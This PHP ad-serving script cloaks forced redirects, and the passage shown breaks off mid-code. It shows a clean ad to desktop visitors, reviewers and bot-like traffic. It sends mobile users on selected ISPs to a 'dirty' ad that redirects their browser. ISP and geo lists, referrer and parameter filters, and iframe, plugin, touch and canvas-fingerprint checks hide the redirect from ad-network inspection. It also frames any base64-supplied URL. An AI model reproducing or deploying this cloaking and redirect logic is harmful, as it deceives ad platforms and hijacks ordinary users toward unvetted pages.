<?php

	$__VERSION = "5.8";

	if (array_key_exists("version", $_GET))
	{
		echo $__VERSION;
		exit;
	}

	//
	// Script usage: http(s)://host/dir/ad.php?<id>
	//
	//
	// This script spits out a clean HTML ad if it detects it's either been accessed by
	// a) A non mobile browser (user agent)
	// b) The IP address is not in the allowed ISP list or blocked due to any blocked lists
	//
	// In all other cases it returns a HTML page with an body onload event, and javascript functiont that redirects to the redirect Url. The scripts basically replaces 2 tags in the
	// clean html: {script}, and {onload}. These tags should be placed in the <head>{script}</head>, and <body{onload}></body> of the clean Html.
	//
	// Ad configuration resides in the <id>.config.txt file, and can define the redirectUrl, the ad language (locale), and which redirect method should be used.
	//

	require_once("include/adlib.inc");

	$allowedIspsPerCountry = array("US" => array("AT&T Wireless",
												 "T-Mobile USA",
												 "Sprint PCS",
												 "Verizon Wireless",
												 "Comcast Cable",
												 "Time Warner Cable",
												 "AT&T U-verse",
												 "Charter Communications",
												 "Cox Communications",
												 "CenturyLink",
												 "Optimum Online",
												 "AT&T Internet Services",
												 "Frontier Communications",
												 "Suddenlink Communications",
												 "XO Communications",
												 "Verizon Internet Services",
												 "Mediacom Cable",
												 "Windstream Communications",
												 "Bright House Networks",
												 "Abovenet Communications",
												 "Google",
												 "Cable One", "VECTANT"),
								   "MX" => array("Telmex","Mega Cable, S.A. de C.V.","Cablemas Telecomunicaciones SA de CV","Cablevisión, S.A. de C.V.","Iusacell","Television Internacional, S.A. de C.V.","Mexico Red de Telecomunicaciones, S. de R.L. de C.","Axtel","Cablevision S.A. de C.V.","Nextel Mexico","Telefonos del Noroeste, S.A. de C.V.","Movistar México","RadioMovil Dipsa, S.A. de C.V."),
								   "FR" => array("Orange","Free SAS","SFR","OVH SAS","Bouygues Telecom","Free Mobile SAS","Bouygues Mobile","Numericable","Orange France Wireless"),
								   "UK" => array("BT","Three","EE Mobile","Telefonica O2 UK","Vodafone","Vodafone Limited"),
								   "AU" => array("Optus","Telstra Internet","Vodafone Australia","TPG Internet","iiNet Limited","Dodo Australia"),
								   "JP" => array("Kddi Corporation","Softbank BB Corp","NTT","Open Computer Network","NTT Docomo,INC.","K-Opticom Corporation","@Home Network Japan","So-net Entertainment Corporation","Biglobe","Jupiter Telecommunications Co.","TOKAI","VECTANT"),
								   "KR" => array("SK Telecom","Korea Telecom","SK Broadband","POWERCOM","Powercomm","LG Powercomm","LG DACOM Corporation","Pubnetplus","LG Telecom"),
								   "BR" => array("Virtua","Vivo","NET Virtua","Global Village Telecom","Oi Velox","Oi Internet","Tim Celular S.A.","Embratel","CTBC","Acom Comunicacoes S.A."),
								   "IN" => array("Airtel","Bharti Airtel Limited","Idea Cellular","Vodafone India","BSNL","Reliance Jio INFOCOMM","Airtel Broadband","Beam Telecom","Tata Mobile","Aircel","Reliance Communications","Hathway","Bharti Broadband")
								  );

	$blacklistedSubDivs1 	= array();
	$blacklistedSubDivs2 	= array(); 
	$blacklistedCountries 	= array();
	$blacklistedContinents 	= array();

	$f_apps_iosBaseFilename 	= "config/f_apps_ios_";
	$f_apps_androidBaseFilename = "config/f_apps_android_";
	$f_site_BaseFilename 		= "config/f_site_";
	$f_siteid_BaseFilename 		= "config/f_siteid_";
	$csvFileSuffix				= ".csv";

	function getCSVContentAsArray($filename)
	{
		$csvDelimiter = "|";
		$result = array();

		if (file_exists($filename))
		{
			$fileContents = file_get_contents($filename);

			if (substr_count($fileContents, "\r\n"))
			{
				$lines = explode("\r\n", $fileContents);
			}
			else if (substr_count($fileContents, "\n"))
			{
				$lines = explode("\n", $fileContents);
			}
			else if (substr_count($fileContents, "\r"))
			{
				$lines = explode("\r", $fileContents);
			}

			foreach ($lines as $line)
			{
				$elements = explode($csvDelimiter, $line);
				$result[$elements[0]] = $elements[1];
			}
		}

		return $result;
	}

	function appendReferrerParameter($url)
	{
		$url = appendParameterPrefix($url);
		$url .= "referrer=";

		return $url;
	}

	function detectMobileOS()
	{
		 $osArray = array("/iphone/i"	=>  "iOS",
	                      "/ipod/i"		=>  "iOS",
	                      "/ipad/i"		=>  "iOS",
	                      "/android/i"	=>  "Android"
		                 );

	    foreach ($osArray as $regex => $value)
	    { 
	        if (preg_match($regex, $_SERVER['HTTP_USER_AGENT']))
	        {
	            return $value;
	        }
	    }

	    return null;
	}

	function isMultiDimensionalArray($array)
	{
		foreach ($array as $element)
		{
			if (is_array($element))
			{
				return true;
			}
		}

		return false;
	}

	function generateAutoRotateParameter($parameter, $sourceWeightList)
	{
		$result = "$parameter=";
		$os = detectMobileOS();

		if ($os != null && array_key_exists($os, $sourceWeightList))
		{
			$result .= weightedRand($sourceWeightList[$os]);
		}
		else if (!empty($sourceWeightList) && !isMultiDimensionalArray($sourceWeightList))
		{
			$result .= weightedRand($sourceWeightList);	
		}

		return $result;
	}

	function appendAutoRotateParameter($url, $parameter, $sourceWeightList)
	{
		return appendParameterPrefix($url) . generateAutoRotateParameter($parameter, $sourceWeightList);
	}

	function minify($text)
	{
		$text = str_replace("\n", "", $text);
		$text = str_replace("\r", "", $text);
		$text = str_replace("\t", "", $text);

		return $text;
	}

	function createJSCode($resultHtml)
	{
		$resultHtml = minify($resultHtml);
		$resultHtml = str_replace("'", "\\'", $resultHtml);

		$resultHtml = "document.write('" . $resultHtml . "');";

		return $resultHtml;
	}

	function renderHTMLTemplate($templateName, $templateParameters)
	{
		$templateFilename = "profiles/htmltemplates/$templateName.html";

		$template = file_get_contents($templateFilename);

		foreach ($templateParameters as $parameter => $parameterValue)
		{
			if (is_array($parameterValue))
			{
				$template = str_replace($parameter, "'" . implode("','", $parameterValue) . "'", $template);
			}
			else
			{
				$template = str_replace($parameter, $parameterValue, $template);
			}
		}

		return $template;
	}

	function voluumadlog($campaignID, $txt)
	{
		$logFilename = "logs/voluumadlog.$campaignID.log";
		$line = $txt . "\n";

		if (!file_exists($logFilename))
		{
			createUTF8File($logFilename);
		}

		$f = fopen($logFilename, "a");
		fwrite($f, $line);
		fclose($f);
	}

	function adlog($campaignID, $ip, $isp, $txt)
	{
		$logFilename = "logs/adlog.$campaignID.log";
		$line = createLogLine($ip, $isp, $txt);

		if (!file_exists($logFilename))
		{
			createUTF8File($logFilename);
		}

		$f = fopen($logFilename, "a");
		fwrite($f, $line);
		fclose($f);
	}

	function mbotlog($campaignID, $ip, $isp, $txt)
	{
		$logFilename = "logs/mbotlog.$campaignID.log";
		$line = createLogLine($ip, $isp, $txt);

		if (!file_exists($logFilename))
		{
			createUTF8File($logFilename);
		}

		$f = fopen($logFilename, "a");
		fwrite($f, $line);
		fclose($f);
	}

	function allowedTrafficLog($campaignID, $ip, $isp)
	{
		$logFilename = "logs/allowed_traffic.$campaignID.log";
		$line = createLogLine($ip, $isp, "CHECK:ALLOWED_TRAFFIC: Serving dirty ad.");

		if (!file_exists($logFilename))
		{
			createUTF8File($logFilename);
		}

		$f = fopen($logFilename, "a");
		fwrite($f, $line);
		fclose($f);
	}

	function trafficLoggerLog($campaignID, $line)
	{
		$logFilename = "logs/traffic_logger.$campaignID.log";

		if (!file_exists($logFilename))
		{
			createUTF8File($logFilename);
		}

		$f = fopen($logFilename, "a");
		fwrite($f, $line . "\n");
		fclose($f);		
	}

	function createTrafficLoggerLogLine()
	{
		$ip  = getClientIP();
		$isp = getISPInfo($ip);

		return str_replace("|Message|\n", "|RequestMethod|" . $_SERVER['REQUEST_METHOD'] . "|", createLogLine($ip, $isp["isp"], ""));

		$referrer = array_key_exists('HTTP_REFERER', $_SERVER) ? $_SERVER['HTTP_REFERER'] : "Unknown";

		$ip  = getClientIP();
		$isp = getISPInfo($ip);

		return "ISP|\"".$isp["isp"]."\"|QueryString|\"".$_SERVER['QUERY_STRING']."\"|Server Referrer|\"".$referer."\"|";
	}	

	function handleTrafficLoggerData($campaignID)
	{
		if ($_SERVER['REQUEST_METHOD'] == "POST" && array_key_exists("data", $_POST))
		{
			$decoded = str_replace("^", "|", urldecode($_POST['data']));
			
			trafficLoggerLog($campaignID, "Type|Info|" . createTrafficLoggerLogLine() . $decoded);

			echo "OK";

			exit;
		}

		if ($_SERVER['REQUEST_METHOD'] == "GET")
		{
			/* GET method as a way to report information */
			if (array_key_exists("data", $_GET))
			{
				$decoded = str_replace("^", "|", urldecode($_GET['data']));
				
				trafficLoggerLog($campaignID, "Type|Info|". createTrafficLoggerLogLine() . $decoded);
				
				// Create a blank image
				$im = imagecreatetruecolor(1, 1);

				// Set the content type header - in this case image/gif
				header('Content-Type: image/gif');

				// Output the image
				imagegif($im);

				// Free up memory
				imagedestroy($im);
				
				exit;
			}
			else if (array_key_exists("nojs", $_GET) && $_GET['nojs'] == 1)
			{		
				trafficLoggerLog($campaignID, "Type|Info|" . createTrafficLoggerLogLine(). "Javascript|false");
				
				// Create a blank image
				$im = imagecreatetruecolor(1, 1);

				// Set the content type header - in this case image/gif
				header('Content-Type: image/gif');

				// Output the image
				imagegif($im);

				// Free up memory
				imagedestroy($im);
				exit;
			}
		}		
	}

	// Redirect method windowtoplocationiframe, serve iframe with redirect url as content
	if (array_key_exists("iframe", $_GET) && array_key_exists("data", $_GET))
	{
		echo "<html><body><iframe frameborder=\"0\" style=\"width:100%;height:100%;\" src=\"" . base64_decode($_GET["data"]) . "\"></iframe></body></html>";
		exit;
	}

	/*
		Cookies:
		_c 					clickID
		_v 					visitorID (only is set if not set, doesn't change, unless cookie is removed by user)
		_vi 				ad.php visits
		_vi<campaignID>		campaign visits
	*/

	// Set ad.php click ID cookie
	$adClickID = uniqid("", true);
	setcookie("_c", $adClickID, strtotime("+1 year"));

	$adVisitorID = isset($_COOKIE["_v"]) ? $_COOKIE["_v"] : null;

	if ($adVisitorID == null)
	{
		$adVisitorID = "V" . uniqid("", true);
		setcookie("_v", $adVisitorID, strtotime("+1 year"));
	}

	// ad.php visits
	$adVisits = isset($_COOKIE["_vi"]) ? $_COOKIE["_vi"] + 1 : 1;
	setcookie("_vi", $adVisits, strtotime("+1 year"));

	$queryString = $_SERVER['QUERY_STRING'];
	$ampIndex = strpos($queryString, "&");

	if ($ampIndex !== false)
	{
		$campaignID = substr($queryString, 0, $ampIndex);
		$queryString = substr($queryString, $ampIndex + 1);
	}
	else
	{
		$campaignID = $queryString;
		$queryString = "";
	}

	// ad.php camp visits
	$adCampVisits = isset($_COOKIE["_v" . $campaignID]) ? $_COOKIE["_v" . $campaignID] + 1 : 1;
	setcookie("_v" . $campaignID, $adCampVisits, strtotime("+1 year"));	

	handleTrafficLoggerData($campaignID);

	$configFilename  = "ads/" . $campaignID . ".config.txt";

	if (!file_exists($configFilename))
	{
		exit;
	}

	$adConfig = processAdConfig($configFilename);

	$redirectUrl 					= array_key_exists("RedirectUrl", $adConfig) ? $adConfig["RedirectUrl"] : "";
	$redirectMethod 				= array_key_exists("Method", $adConfig) ? $adConfig["Method"] : "";
	$redirectSubMethod1				= array_key_exists("RedirectSubMethod1", $adConfig) ? $adConfig["RedirectSubMethod1"] : "";
	$redirectSubMethod2				= array_key_exists("RedirectSubMethod2", $adConfig) ? $adConfig["RedirectSubMethod2"] : "";
	$redirectTimeout 				= array_key_exists("RedirectTimeout", $adConfig) ? $adConfig["RedirectTimeout"] : 3000;
	$redirectEnabled				= array_key_exists("RedirectEnabled", $adConfig) && $adConfig["RedirectEnabled"] === "false" ? false : true;
	$voluumTotalAds					= array_key_exists("VoluumTotalAds", $adConfig) ? $adConfig["VoluumTotalAds"] : -1;
	$voluumAdDisplayCap				= array_key_exists("VoluumAdDisplayCap", $adConfig) ? $adConfig["VoluumAdDisplayCap"] : -1;
	$adCountry 						= array_key_exists("CountryCode", $adConfig) ? $adConfig["CountryCode"] : "";
	$allowedIspsPerCountry			= array_key_exists("AllowedISPS", $adConfig) && !empty($adConfig["AllowedISPS"]) ? array($adCountry => preg_split("/\|/", $adConfig["AllowedISPS"], -1, PREG_SPLIT_NO_EMPTY)) : $allowedIspsPerCountry;
	$blacklistedProvinces 			= array_key_exists("ProvinceBlackList", $adConfig) ? preg_split("/\|/", $adConfig["ProvinceBlackList"], -1, PREG_SPLIT_NO_EMPTY) : array();
	$blacklistedCities 				= array_key_exists("CityBlackList", $adConfig) ? preg_split("/\|/", $adConfig["CityBlackList"], -1, PREG_SPLIT_NO_EMPTY) : array();
	$canvasFingerprintCheckEnabled 	= array_key_exists("CanvasFingerprintCheckEnabled", $adConfig) && $adConfig["CanvasFingerprintCheckEnabled"] === "false" ? false : true;
	$blockedCanvasFingerprints		= array_key_exists("BlockedCanvasFingerprints", $adConfig) ? $adConfig["BlockedCanvasFingerprints"] : "";
	$outputMethod 					= array_key_exists("OutputMethod", $adConfig) ? $adConfig["OutputMethod"] : "";
	$trackingPixelEnabled			= array_key_exists("TrackingPixelEnabled", $adConfig) && $adConfig["TrackingPixelEnabled"] === "false" ? false : true;
	$trackingPixelUrl 				= array_key_exists("TrackingPixelUrl", $adConfig) ? $adConfig["TrackingPixelUrl"] : "";
	$cloakTrackingPixelEnabled		= array_key_exists("CloakTrackingPixelEnabled", $adConfig) && $adConfig["CloakTrackingPixelEnabled"] === "false" ? false : true;
	$cloakTrackingPixelUrl 			= array_key_exists("CloakTrackingPixelUrl", $adConfig) ? $adConfig["CloakTrackingPixelUrl"] : "";
	$loggingEnabled 				= array_key_exists("LoggingEnabled", $adConfig) && $adConfig["LoggingEnabled"] === "false" ? false : true;
	$ispCloakingEnabled 			= array_key_exists("ISPCloakingEnabled", $adConfig) && $adConfig["ISPCloakingEnabled"] === "false" ? false : true;
	$iframeCloakingEnabled 			= array_key_exists("IFrameCloakingEnabled", $adConfig) && $adConfig["IFrameCloakingEnabled"] === "false" ? false : true;
	$pluginCloakingEnabled 			= array_key_exists("PluginCloakingEnabled", $adConfig) && $adConfig["PluginCloakingEnabled"] === "false" ? false : true;
	$touchCloakingEnabled 			= array_key_exists("TouchCloakingEnabled", $adConfig) && $adConfig["TouchCloakingEnabled"] === "false" ? false : true;
	$blacklistedReferrers 			= array_key_exists("BlacklistedReferrers", $adConfig) ? preg_split("/\|/", $adConfig["BlacklistedReferrers"], -1, PREG_SPLIT_NO_EMPTY) : array();
	$whitelistedReferrers 			= array_key_exists("WhitelistedReferrers", $adConfig) ? preg_split("/\|/", $adConfig["WhitelistedReferrers"], -1, PREG_SPLIT_NO_EMPTY) : array();
	$blockedParameterValues			= array_key_exists("BlockedParameterValues", $adConfig) ? json_decode($adConfig["BlockedParameterValues"]) : array();
	$blockedReferrerParameterValues	= array_key_exists("BlockedReferrerParameterValues", $adConfig) ? json_decode($adConfig["BlockedReferrerParameterValues"]) : array();
	$consoleLoggingEnabled 			= array_key_exists("ConsoleLoggingEnabled", $adConfig) && $adConfig["ConsoleLoggingEnabled"] === "false" ? false : true;
	$forceDirtyAd 					= array_key_exists("ForceDirtyAd", $adConfig) && $adConfig["ForceDirtyAd"] === "false" ? false : true;
	$trafficLoggerEnabled			= array_key_exists("TrafficLoggerEnabled", $adConfig) && $adConfig["TrafficLoggerEnabled"] === "true" ? true : false;
	$HTMLTemplate 					= array_key_exists("HTMLTemplate", $adConfig) ? $adConfig["HTMLTemplate"] : "";
	$HTMLTemplateValues 			= array_key_exists("HTMLTemplateValues", $adConfig) ? json_decode($adConfig["HTMLTemplateValues"]) : "";

	if (!empty($HTMLTemplate))
	{
		$resultHtml = renderHTMLTemplate($HTMLTemplate, $HTMLTemplateValues);
	}
	else
	{
		$cleanHtmlFilename = "ads/" . $campaignID . ".cleanad.html";
		$resultHtml = file_get_contents($cleanHtmlFilename);
	}

	if (empty($redirectUrl))
	{
		exit;
	}

	if (empty($adCountry))
	{
		$adCountry = "US";
	}

	// Preprocess referrer for usage
	if (!array_key_exists("HTTP_REFERER", $_SERVER) || $_SERVER['HTTP_REFERER'] === "")
	{
		$_SERVER['HTTP_REFERER'] = "_empty_";
	}	

	$ip  = getClientIP();
	$geo = getGEOInfo($ip);
	$isp = getISPInfo($ip);

	if ($loggingEnabled)
	{
		adlog($campaignID, $ip, $isp["isp"],
			"INFO:GEO:" .
			'ip:"'.$ip.'",'.
			'isp:"'.$isp["isp"].'",'.
			'city:"'.$geo['city'].'",'.
			'province:"'.$geo['province'].'",'.
			'country:"'.$geo['country'].'",'.
			'country_code:"'.$geo['country_code'].'",'.
			'continent:"'.$geo['continent'].'",'.
			'continent_code:"'.$geo['continent_code'].'",'.
			'subdiv1:"'.$geo['subdiv1'].'",'.
			'subdiv1_code:"'.$geo['subdiv1_code'].'",'.
			'subdiv2:"'.$geo['subdiv2'].'",'.
			'subdiv2_code:"'.$geo['subdiv2_code'].'"');
	}

	$trackingPixelCloakTestParameters = array();

	if ($trafficLoggerEnabled)
	{
		$serveCleanAd = true;

		if ($loggingEnabled)
		{
			adlog($campaignID, $ip, $isp["isp"], "Traffic Logger Enabled.");
		}		
	}
	else
	{
		$serveCleanAd = false;
	}

	if (!$serveCleanAd)
	{
		foreach ($blacklistedReferrers as $blackListedReferrer)
		{
			if (strpos($_SERVER['HTTP_REFERER'], $blackListedReferrer) !== false)
			{
				$serveCleanAd = true;

				$trackingPixelCloakTestParameters[] = "referrerBlackListBlocked=" . $_SERVER['HTTP_REFERER'];

				if ($loggingEnabled)
				{
					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_BLACKLIST_BLOCKED:$_SERVER[HTTP_REFERER]: Referrer $_SERVER[HTTP_REFERER] is in blacklist.");
				}

				break;
			}
		}

		if (!$serveCleanAd)
		{
			$trackingPixelCloakTestParameters[] = "referrerBlackListAllowed=" . $_SERVER['HTTP_REFERER'];

			if ($loggingEnabled)
			{
				mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_BLACKLIST_ALLOWED:$_SERVER[HTTP_REFERER]: Referrer $_SERVER[HTTP_REFERER] is NOT in blacklist.");
			}
		}

		if (!$serveCleanAd && !empty($whitelistedReferrers))
		{
			$matchedWhitelistedReferrer = false;

			foreach ($whitelistedReferrers as $whitelistedReferrer)
			{
				if (strpos($_SERVER['HTTP_REFERER'], $whitelistedReferrer) !== false)
				{
					$matchedWhitelistedReferrer = true;

					break;
				}
			}

			if (!$matchedWhitelistedReferrer)
			{
				$serveCleanAd = true;

				$trackingPixelCloakTestParameters[] = "referrerWhiteListBlocked=" . $_SERVER['HTTP_REFERER'];

				if ($loggingEnabled)
				{
					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_WHITELIST_BLOCKED:$_SERVER[HTTP_REFERER]: Referrer $_SERVER[HTTP_REFERER] is not in whitelist.");
				}
			}
			else
			{
				$trackingPixelCloakTestParameters[] = "referrerWhiteListAllowed=" . $_SERVER['HTTP_REFERER'];

				if ($loggingEnabled)
				{
					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_WHITELIST_ALLOWED:$_SERVER[HTTP_REFERER]: Referrer $_SERVER[HTTP_REFERER] is in whitelist.");
				}
			}
		}
	}

	// Check querystring parameters against blocked parameter values
	if (!$serveCleanAd)
	{
		foreach ($blockedParameterValues as $parameter => $blockedValues)
		{
			if (array_key_exists($parameter, $_GET))
			{
				if (in_array($_GET[$parameter], $blockedValues))
				{
					$serveCleanAd = true;

					$trackingPixelCloakTestParameters[] = "parameterBlocked=" . $_GET[$parameter];

					if ($loggingEnabled)
					{
						mbotlog($campaignID, $ip, $isp["isp"], "CHECK:PARAMETER_BLOCKED:$parameter:$_GET[$parameter]: Parameter $parameter has blocked value: $_GET[$parameter].");
					}

					break;
				}
				else
				{ 
					$trackingPixelCloakTestParameters[] = "parameterAllowed=" . $_GET[$parameter];

					if ($loggingEnabled)
					{
						mbotlog($campaignID, $ip, $isp["isp"], "CHECK:PARAMETER_ALLOWED:$parameter:$_GET[$parameter]: Parameter $parameter with value $_GET[$parameter] is allowed.");
					}
				}
			}
			else
			{
				$serveCleanAd = true;

				if ($loggingEnabled)
				{
					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:PARAMETER_MISSING:$parameter: Parameter $parameter missing from querystring.");
				}

				break;
			}
		}
	}

	// Check referrer querystring parameters against blocked parameter values

	$referrerParameters = array();
	parse_str(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_QUERY), $referrerParameters);

	if (!$serveCleanAd)
	{
		foreach ($blockedReferrerParameterValues as $parameter => $blockedValues)
		{
			if (array_key_exists($parameter, $referrerParameters))
			{
				if (in_array($referrerParameters[$parameter], $blockedValues))
				{
					$serveCleanAd = true;

					$trackingPixelCloakTestParameters[] = "parameterBlocked=" . $referrerParameters[$parameter];

					if ($loggingEnabled)
					{
						mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_PARAMETER_BLOCKED:$parameter:$referrerParameters[$parameter]: Parameter $parameter has blocked value: $referrerParameters[$parameter].");
					}

					break;
				}
				else 
				{
					$trackingPixelCloakTestParameters[] = "parameterAllowed=" . $referrerParameters[$parameter];

					if ($loggingEnabled)
					{
						mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_PARAMETER_ALLOWED:$parameter:$referrerParameters[$parameter]: Parameter $parameter with value $referrerParameters[$parameter] is allowed.");
					}
				}
			}
			else
			{
				$serveCleanAd = true;

				if ($loggingEnabled)
				{
					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_PARAMETER_MISSING:$parameter: Parameter $parameter missing from referrer querystring.");
				}

				break;
			}
		}
	}

	if (!$serveCleanAd && !preg_match('/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile|MIDP|BB10)/i', $_SERVER['HTTP_USER_AGENT']))
	{
		$serveCleanAd = true;

		if ($loggingEnabled)
		{
			adlog($campaignID, $ip, $isp["isp"], "CHECK:USERAGENT_MOBILE:$_SERVER[HTTP_USER_AGENT]: UserAgent is not a mobile device.");
		}
	}
	else if (!$serveCleanAd && $ispCloakingEnabled)
	{
		$allowedIsps = array();

		if (array_key_exists($adCountry, $allowedIspsPerCountry))
		{
			$allowedIsps = $allowedIspsPerCountry[$adCountry];
		}

		if ((empty($allowedIsps) || in_array($isp["isp"], $allowedIsps)) &&
			!in_array($geo['city'], $blacklistedCities) &&
			!in_array($geo['province'], $blacklistedProvinces) &&
			!in_array($geo['subdiv1_code'], $blacklistedSubDivs1) &&
			!in_array($geo['subdiv2_code'], $blacklistedSubDivs2) &&
			!in_array($geo['country'], $blacklistedCountries) &&
			!in_array($geo['continent'], $blacklistedContinents))
		{
			$serveCleanAd - false;

			$trackingPixelCloakTestParameters[] = "ispAllowed=" . urlencode($isp["isp"]);

			if ($loggingEnabled)
			{
				adlog($campaignID, $ip, $isp["isp"], "CHECK:GEO_ALLOWED: ISP/Geo is allowed. ISP: " . $isp["isp"]);
			}
		}
		else
		{
			$serveCleanAd = true;

			$trackingPixelCloakTestParameters[] = "ispBlocked=" . urlencode($isp["isp"]);

			if ($loggingEnabled)
			{
				adlog($campaignID, $ip, $isp["isp"], "CHECK:GEO_BLOCKED: ISP/Geo is NOT allowed. ISP: " . $isp["isp"]);
			}
		}
	}

	$referrerDomainScript = "function getReferrerDomain()
						     {
					            var topDomain = '';

					            try
					            {
					                topDomain = window.top.location.href;
					            }
					            catch(e) { }

					            if (topDomain == null || topDomain === 'undefined' || typeof topDomain == 'undefined' || topDomain.trim() === '')
					            {
					                topDomain = document.referrer;
					            }

					            return topDomain;
						     }";

	if ($trackingPixelEnabled && !empty($trackingPixelUrl))
	{
		// Append referrer
		$trackingPixelUrl = appendReferrerParameter($trackingPixelUrl);

		$trackingPixelScript = getTrackingPixelCode("addTrackingPixel", $trackingPixelUrl);
	}

	if ($cloakTrackingPixelEnabled && !empty($cloakTrackingPixelUrl))
	{
		if (!empty($trackingPixelCloakTestParameters))
		{
			// Append cloaking test results for Voluum
			$cloakTrackingPixelUrl = appendParameterPrefix($cloakTrackingPixelUrl);
			$cloakTrackingPixelUrl .= implode("&", $trackingPixelCloakTestParameters);
		}

		// Append referrer
		$cloakTrackingPixelUrl = appendReferrerParameter($cloakTrackingPixelUrl);

		$cloakTrackingPixelScript = getTrackingPixelCode("addCloakTrackingPixel", $cloakTrackingPixelUrl, 
			"(typeof testResults != 'undefined' ? ('&' + (testResults.isTouchTest ? 'touchSuccess=' + encodeURIComponent(getReferrerDomain()) : 'touchFailed=' + encodeURIComponent(getReferrerDomain())) + '&' + (testResults.platformTest ? 'platformSuccess=' + window.navigator.platform : 'platformFailed=' + window.navigator.platform)) : '')");
	}

	if (($serveCleanAd || !$redirectEnabled) && !$forceDirtyAd)
	{
		if ($loggingEnabled && !$redirectEnabled)
		{
			adlog($campaignID, $ip, $isp["isp"], "CHECK:REDIRECT_DISABLED: Redirect disabled.");
		}

		$scriptElements = array();
		$onloadElements = array();

		$scriptElements[] = minify("<script type=\"text/javascript\">" . $referrerDomainScript . "</script>");

		if ($trackingPixelEnabled && !empty($trackingPixelUrl))
		{
			$scriptElements[] = minify("<script type=\"text/javascript\">"  . $trackingPixelScript . "</script>");
			$onloadElements[] = "addTrackingPixel();";
		}

		if ($cloakTrackingPixelEnabled && !empty($cloakTrackingPixelUrl))
		{
			$scriptElements[] = minify("<script type=\"text/javascript\">" . $cloakTrackingPixelScript . "</script>");
			$onloadElements[] = "addCloakTrackingPixel();";			
		}

		if ($trafficLoggerEnabled)
		{
			$scriptElements[] = "<script src=\"js/lg.me.js\"></script>";
			$onloadElements[] = "f.go('" . getCurrentPageUrl() . "');";
		}

		$resultHtml = str_replace("{script}", implode("", $scriptElements), $resultHtml);
		$resultHtml = str_replace("{onload}", !empty($onloadElements) ? " onload=\"" . implode("", $onloadElements) . "\"" : "", $resultHtml);

		if ($outputMethod === "JS")
		{
			$resultHtml = str_replace("{queryString}", $queryString, $resultHtml);

			$resultHtml = createJSCode($resultHtml);
		}
	}
	else
	{
		$trackingPixelCloakTestParameters[] = "allowedTraffic=" . $isp["isp"];

		if ($loggingEnabled)
		{
			allowedTrafficLog($campaignID, $ip, $isp["isp"]);

			if ($forceDirtyAd)
			{
				adlog($campaignID, $ip, $isp["isp"], "Force Dirty Ad enabled.");
			}
		}

		$redirectUrl = appendParameterPrefix($redirectUrl) . "ccid=$adClickID";

		if ($voluumTotalAds > 0 && $voluumAdDisplayCap > 0)
		{
			$calculatedAdIndex = (((int)($adCampVisits / $voluumAdDisplayCap) % $voluumTotalAds) + 1);

			if ($loggingEnabled)
			{
				voluumadlog($campaignID, "Timestamp|" . date("Y-m-d H:i:s") . "|IP|$_SERVER[REMOTE_ADDR]|VisitorID|$adVisitorID|Visits|$adCampVisits|AdNumber|$calculatedAdIndex");
			}

			$redirectUrl = appendParameterPrefix($redirectUrl) . "ad=582" . $calculatedAdIndex;
		}

		$f_apps_WeightList["iOS"] 		= getCSVContentAsArray($f_apps_iosBaseFilename . $adCountry . $csvFileSuffix);
		$f_apps_WeightList["Android"] 	= getCSVContentAsArray($f_apps_androidBaseFilename . $adCountry . $csvFileSuffix);

		$f_site_WeightList 				= getCSVContentAsArray($f_site_BaseFilename . $adCountry . $csvFileSuffix);
		$f_siteid_WeightList 			= getCSVContentAsArray($f_siteid_BaseFilename . $adCountry . $csvFileSuffix);

		// Append auto generated source parameter
		$redirectUrl = appendAutoRotateParameter($redirectUrl, "f_apps", $f_apps_WeightList);
		$redirectUrl = appendAutoRotateParameter($redirectUrl, "f_site", $f_site_WeightList);
		$redirectUrl = appendAutoRotateParameter($redirectUrl, "f_siteid", $f_siteid_WeightList);

		// Append passed in script parameters if outputMethod == JS
		if ($outputMethod === "JS")
		{
			$redirectUrl .= appendParameterPrefix($redirectUrl) . $queryString;
		}

		// Append referrer
		$redirectUrl = appendReferrerParameter($redirectUrl);

		if ($loggingEnabled)
		{
			adlog($campaignID, $ip, $isp["isp"], $redirectUrl);
		}

		if ($redirectMethod === "trycatchredirect")
		{
			$redirectCode = "try
							 {
								 " . getRedirectCode($redirectSubMethod1, $redirectUrl) . "
							 }
							 catch(e)
							 {
							 	try
							 	{
							 		" . getRedirectCode($redirectSubMethod2, $redirectUrl) . "
							 	}
							 	catch(e)
							 	{
							 	}
							 }";
		}
		else
		{
			$redirectCode = getRedirectCode($redirectMethod, $redirectUrl);
		}

		$scriptCode = "<script type=\"text/javascript\">

						var testResults = {};

						if (typeof jslog !== 'function')
						{
							jslog = function(text) { " . ($consoleLoggingEnabled ? "console.log(text);" : "") . " }
						}" .

						($trackingPixelEnabled && !empty($trackingPixelUrl) ? $trackingPixelScript : "") .
						($cloakTrackingPixelEnabled && !empty($cloakTrackingPixelUrl) ? $cloakTrackingPixelScript : "") .

					   	($iframeCloakingEnabled ? file_get_contents("js/iframetest.js") : "") .
			   			($pluginCloakingEnabled ? file_get_contents("js/plugintest.js") : "") .
			   			($touchCloakingEnabled ? file_get_contents("js/touchtest.js") : "") .
						($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? file_get_contents("js/canvasfingerprinttest.js") : "") .
						(true ? file_get_contents("js/platformtest.js") : "") .

					   "
					   	function inBlockedCanvasList()
						{
							var blockedList = [null, $blockedCanvasFingerprints];
							var canvasFingerPrint = getCanvasFingerprint();

							var result = blockedList.indexOf(canvasFingerPrint) !== -1;

							if (result)
							{
								jslog('CHECK:CANVASFINGERPRINT_BLOCKED: CanvasFingerprint: ' + canvasFingerPrint + ' in blocked list.');
							}
							else
							{
								jslog('CHECK:CANVASFINGERPRINT_ALLOWED: CanvasFingerprint: ' + canvasFingerPrint + ' NOT in blocked list.');
							}

							return result;
						}

						$referrerDomainScript

						function go()
						{\n" .
							($trackingPixelEnabled && !empty($trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
						   	($iframeCloakingEnabled ? "testResults.inIFrameTest = (inIFrame());\n" : "") .
				   			($pluginCloakingEnabled ? "testResults.hasPluginsTest = (!hasPlugins());\n" : "") .
				   			($touchCloakingEnabled ? "testResults.isTouchTest = (isTouch());\n" : "") .
